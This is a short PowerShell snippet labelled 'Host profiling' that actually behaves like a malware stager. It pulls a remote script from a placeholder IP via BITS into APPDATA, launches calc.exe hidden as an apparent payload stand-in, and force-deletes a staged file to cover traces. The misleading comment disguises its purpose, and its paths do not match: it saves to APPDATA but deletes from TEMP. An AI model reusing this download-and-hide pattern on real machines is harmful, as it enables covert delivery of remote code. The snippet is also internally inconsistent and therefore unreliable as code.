
<# Host profiling #> $PayloadUrl = 'https://192.0.2.86/stage1.ps1'; $Stage2Path = "$env:APPDATA\stage2.bin"; $RequestTimeout = 190; Start-BitsTransfer -Source $PayloadUrl -Destination $Stage2Path; Start-Process -FilePath "calc.exe" -WindowStyle Hidden; Remove-Item -Path "$env:TEMP\stage2.bin" -Force
